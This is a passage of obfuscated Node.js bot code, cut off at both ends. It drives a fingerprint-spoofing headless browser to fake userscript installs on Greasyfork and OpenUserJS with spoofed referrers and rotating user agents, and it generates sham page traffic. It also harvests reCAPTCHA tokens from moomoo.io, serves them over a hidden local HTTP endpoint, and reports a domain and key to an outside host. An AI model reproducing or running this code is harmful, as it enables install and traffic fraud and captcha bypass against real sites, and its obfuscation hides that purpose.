      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + Z(0x1f) + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': Z(0x17) + 'easyfork.o' + Z(0xe) + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + Z(0xe) + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + Z(0x1b) + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + Z(0x6) + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + Z(0x12) + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + Z(0x1d),
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + Z(0x8) + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + a0(0x11, 'JvDh'),
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + a0(0x19, '0]AO') + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x0
  };
if (((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: i
    } = require('fakebrowse' + 'r'), j = require('path')['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), k = new i['Builder']()['displayUse' + 'rActionLay' + 'er'](0x0)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](j);
    let l;
    w:
      for (;;)
        try {
          let p = await async function q() {
            let u;
            const v = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              u = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': v
              }))?.['data'];
            } catch (w) {}
            if (u)
              try {
                u = (await axios['get'](u, {
                  'headers': v
                }))?.['data'];
              } catch (x) {}
            if (!u)
              return await randomWait(), await q();
            try {
              return 'object' == typeof u ? u : 'string' == typeof u ? JSON['parse'](u) : {};
            } catch (y) {
              if (!u)
                return await randomWait(), await q();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && k['deviceDesc' + 'riptor'](p), l = await k['launch']();
          break w;
        } catch (u) {
          warn(u), await randomWait();
        }
    const m = l['userAction'];
    log('browser\x20la' + 'unched');
    const n = l['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(n, m);
    }, 0x64), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(n, m);
    }, 0x64), doFlags['doNetOnly'] && setTimeout(async () => {
      const v = axios['create']({
        'headers': {
          'User-Agent': userAgents['random']()
        }
      });
      v['get'](miscSites['random'](), {
        'timeout': 0x0,
        'headers': {
          'User-Agent': userAgents['random'](),
          'Accept-Encoding': 'none'
        }
      })['catch'](w => {}), setInterval(() => {
        v['get'](miscSites['random'](), {
          'timeout': 0x0,
          'headers': {
            'User-Agent': userAgents['random'](),
            'Accept-Encoding': 'none'
          }
        })['catch'](w => {});
      }, 0x1b58 * getRandomInt(0x1, 0x5)), doFlags['doPageLoad' + 'er'] && async function w() {
        const x = await n['createInco' + 'gnitoBrows' + 'erContext'](),
          y = await x['newPage']();
        for (;;) {
          let z = 0x0;
          if (await y['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](A => z++), await randomWait(), z)
            return await y['close'](), await x['close'](), await w();
          for (let A = 0x0; A < getRandomInt(0x1, 0x5); A++)
            await y['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0xea60);
        }
      }();
    }, 0x64), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function v() {
      const a1 = f;

      function w() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](B => {});
      }
      const x = await n['createInco' + 'gnitoBrows' + 'erContext']();
      let y = 0x0;
      const z = await x['newPage']();
      if (await z['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](B => y++), y)
        return await z['close'](), await x['close'](), v();
      if (!(await z['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await z['close'](), await x['close'](), v();
      let A;
      if (doFlags['doDual']) {
        if (A = await x['newPage'](), await A['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](C => y++), y)
          return await A['close'](), await x[a1(0x13)](), v();
        const B = await A['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(B['slice'](0x0, 0x32)), !B['includes']('isMoomooIo'))
          return await A['close'](), await x['close'](), v();
      }
      g['getToken'] = async function(C) {
        return await (C && doFlags['doDual'] ? A : z)['evaluate'](async () => new Promise(async (D, E) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](F => {
            D(F);
          });
        }));
      }, w(), setInterval(w, 0x7530);
    }, 0x64);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(i, j) {
    const k = url['parse'](i['url'])['pathname'];
    j['writeHead'](0xc8);
    const l = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == k;
    l || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == k ? j['write'](await g['getToken'](l) || '') : j['write']('v0.6'), j['end']();
  });
  e['listen'](process['env']['PORT'] || 0x1f90);
}
doFlags['doOUJS'] && ((async () => {
  const a3 = h,
    a2 = d;
  async function i() {
    const m = j['random'](),
      q = m['replace']('/scripts/', '/install/') + '.user.js',
      [u, v] = (function() {
        const B = l['random']();
        return [
          B,
          B['includes']('Firefox')
        ];
      }()),
      w = function(B, C = 0x1) {
        if (B['includes']('Firefox'))
          return B['slice'](B['indexOf']('Firefox') + 'Firefox' ['length'] + 0x1);
        const D = B['indexOf']('Chrome/') + 'Chrome/' ['length'],
          E = B['slice'](D),
          F = E['slice'](0x0, E['indexOf']('\x20'));
        return C ? F['slice'](0x0, F['indexOf']('.')) : F;
      }(u),
      x = {
        'signal': AbortSignal['timeout'](0x2710),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': u,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    v ? Object['assign'](x['headers'], {
      'te': 'trailers'
    }) : Object['assign'](x['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + w + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const y = await fetch(k, x)['catch'](B => {});
    if (!y || !y['headers'])
      return;
    if (null === y['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const z = {
      'signal': AbortSignal['timeout'](0x2710),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': u,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': k,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (v ? Object['assign'](z['headers'], {
        'te': 'trailers'
      }) : Object['assign'](z['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + w + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(m, z)['catch'](B => {}))
      return;
    const A = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    v ? Object['assign'](A['headers'], {
      'te': 'trailers'
    }) : Object['assign'](A['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + w + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(q, A);
  }
  const j = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + a2(0xb, '0]AO') + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    k = 'https://op' + 'enuserjs.o' + 'rg/',
    l = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + a3(0x1) + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  i();
  for (let m = 0x0; m < 0x4; m++)
